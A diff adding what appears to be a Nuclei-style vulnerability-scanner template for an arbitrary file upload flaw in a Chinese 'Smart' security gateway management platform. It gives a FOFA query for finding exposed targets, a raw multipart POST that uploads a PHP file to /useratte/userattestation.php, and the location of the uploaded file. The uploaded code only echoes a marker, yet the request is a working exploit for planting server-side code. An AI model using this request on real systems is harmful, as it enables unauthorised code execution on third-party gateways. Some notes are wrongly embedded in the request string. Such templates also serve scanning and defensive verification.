@@ -1,0 +1,92 @@
+id: poc-oe8rvfwoddglg9bd
+info:
+  name: Smart多业务安全网关智能管理平台 任意文件上传漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/oe8rvfwoddglg9bd'
+  tags: file-upload,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: oe8rvfwoddglg9bd
+    fofa: title="Smart--管理平台"
+http:
+- raw:
+  - 'POST /useratte/userattestation.php HTTP/1.1
+
+
+    Cookie:
+
+
+    Content-Type: multipart/form-data; boundary=---------------------------42328904123665875270630079328
+
+
+
+
+    -----------------------------42328904123665875270630079328
+
+
+    Content-Disposition: form-data; name="web_img"; filename="dudesite.php"
+
+
+    Content-Type: application/octet-stream
+
+
+
+
+    <?php echo 1234;?>
+
+
+    -----------------------------42328904123665875270630079328
+
+
+    Content-Disposition: form-data; name="id_type"
+
+
+
+
+    1
+
+
+    -----------------------------42328904123665875270630079328
+
+
+    Content-Disposition: form-data; name="1_ck"
+
+
+
+
+    1_radhttp
+
+
+    -----------------------------42328904123665875270630079328
+
+
+    Content-Disposition: form-data; name="hidwel"
+
+
+
+
+    set
+
+
+    -----------------------------42328904123665875270630079328?
+
+
+    # 响应代码特征
+
+    200
+
+
+    # 响应内容特征
+
+    暂无
+
+
+    # 上传文件定位
+
+    /boot/web/upload/weblogo/dudesite.php'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
